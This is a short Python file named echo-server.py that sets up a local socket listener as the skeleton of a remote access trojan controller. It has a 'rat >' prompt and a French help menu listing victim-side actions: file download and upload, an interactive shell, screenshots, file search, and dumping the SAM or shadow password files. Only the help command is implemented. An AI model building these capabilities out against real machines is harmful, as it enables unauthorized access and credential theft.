# echo-server.py

import socket

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 65432  # Port to listen on (non-privileged ports are > 1023)

help_menu =	{
  "help": "Afficher la liste des commandes disponibles.",
  "download": "Recuperation de fichiers de la victime vers le serveur.",
  "upload": "Recuperation de fichiers du serveur vers la victime",
  "shell": "ouvrir un shell (bash ou cmd) interactif.",
  "ipconfig": "Obtenir la configuration reseau de la machine victime.",
  "screenshot": "Prendre une capture d'ecran de la machine victime.",
  "search": "Rechercher un fichier sur la machine victime",
  "hashdump": "Recuperer la base SAM ou le fichier shadow de la machine."
}

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_listening:
    socket_listening.bind((HOST, PORT))
    socket_listening.listen()
    print("[*] Listening on 65432...")
    client_connection, client_address = socket_listening.accept()
    print("[+] Agent received !")
    with client_connection:
        print(f"Connected by {client_address}")
        user_input = input("rat > ")
        while client_connection and user_input != "exit":
            match user_input:
                    case "help":
                        for x, y in help_menu.items():
                            print(f"\n{x} : {y}\n")

            user_input = input("rat > ")

            #data = client_connection.recv(1024)
            #if not data:
            #    break
            #client_connection.send(data)